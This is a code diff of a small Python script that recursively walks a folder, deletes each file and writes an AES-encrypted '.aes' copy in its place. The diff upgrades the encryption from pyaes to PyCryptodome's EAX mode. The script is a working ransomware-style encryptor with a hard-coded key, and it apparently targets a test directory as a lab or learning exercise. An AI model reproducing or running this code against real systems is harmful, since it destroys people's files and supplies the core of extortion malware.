@@ -1,31 +1,38 @@
 import os
-import pyaes
-import base64
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
+from Crypto.Util.Padding import pad
 
 key = b"0000000000000000"
-aes = pyaes.AESModeOfOperationCTR(key)
 
 def traverse(root_dir):
   print('traversing: ' + root_dir)
   for path, subdirs, files in os.walk(root_dir):
     for subdir in subdirs:
-      print('traversing subdir: ' + subdir)
       traverse(os.path.join(path, subdir))
     for f in files:
       print('found file: ' + f)
       filepath = os.path.join(path, f)
-      file = open(filepath, "rb")
-      contents = file.read()
-      file.close()
+      filename_split = os.path.splitext(filepath)
 
-      os.remove(filepath)
+      if (filename_split[1] != '.aes'):
 
-      encrypted_contents = aes.encrypt(contents)
-      encoded_contents = base64.b64encode(encrypted_contents)
+        plain_file = open(filepath, "rb")
+        plain_data = plain_file.read()
+        plain_file.close()
 
-      out = open(f"{filepath}.aes", "wb")
-      print('writing encrypted contents for ' + f)
-      out.write(encoded_contents)
-      out.close()
+        os.remove(filepath)
+
+        cipher = AES.new(key, AES.MODE_EAX, get_random_bytes(16))
+        ciphertext, tag = cipher.encrypt_and_digest(plain_data)
+
+        out_filename = filepath + '.aes'
+
+        with open(f"{out_filename}", "wb") as encrypted_file:
+          encrypted_file.write(cipher.nonce)
+          encrypted_file.write(tag)
+          encrypted_file.write(ciphertext)
+
+        encrypted_file.close()
 
 traverse('test_root')
